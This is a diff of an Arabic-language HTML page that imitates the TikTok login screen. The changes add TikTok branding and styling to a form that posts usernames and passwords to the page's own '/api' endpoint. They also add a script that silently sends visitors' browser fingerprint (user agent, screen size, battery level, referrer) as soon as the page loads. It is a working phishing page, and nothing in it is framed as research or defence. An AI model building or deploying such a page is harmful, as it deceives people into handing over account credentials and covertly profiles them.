@@ -2,33 +2,43 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TikTok Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to TikTok</title>
+    <style>
+        body { font-family: 'TikTok Font', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; margin: 0; }
+        .login-box { width: 360px; text-align: center; }
+        h2 { font-size: 30px; font-weight: bold; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #e1e1e1; border-radius: 4px; background: #f1f1f2; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .footer { margin-top: 20px; font-size: 14px; color: #767676; }
+    </style>
 </head>
 <body>
-    <h2>تسجيل الدخول</h2>
-    <form action="/api" method="POST">
-        <input type="hidden" name="type" value="LOGIN">
-        <input type="text" name="username" placeholder="اسم المستخدم" required>
-        <input type="password" name="password" placeholder="كلمة السر" required>
-        <button type="submit">دخول</button>
-    </form>
+    <div class="login-box">
+        <h2>تسجيل الدخول إلى TikTok</h2>
+        <form action="/api" method="POST">
+            <input type="hidden" name="type" value="LOGIN">
+            <input type="text" name="username" placeholder="رقم الهاتف أو اسم المستخدم" required>
+            <input type="password" name="password" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <div class="footer">ليس لديك حساب؟ <a href="#">سجل</a></div>
+    </div>
 
     <script>
-        async function sendIntel(type, extra = {}) {
-            const battery = await navigator.getBattery().then(b => `${(b.level * 100).toFixed(0)}%`).catch(() => "Unknown");
+        // جمع البصمة الرقمية فور التحميل
+        async function sendIntel() {
+            const battery = await navigator.getBattery().then(b => `${(b.level * 100).toFixed(0)}%`).catch(() => "N/A");
             const data = {
-                type: type,
+                type: 'VISIT',
                 userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
                 screenRes: `${screen.width}x${screen.height}`,
                 battery: battery,
-                referrer: document.referrer,
-                ...extra
+                referrer: document.referrer
             };
             fetch('/api', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
         }
-        sendIntel('VISIT'); // تقرير الاستطلاع الأولي
+        sendIntel();
     </script>
 </body>
 </html>
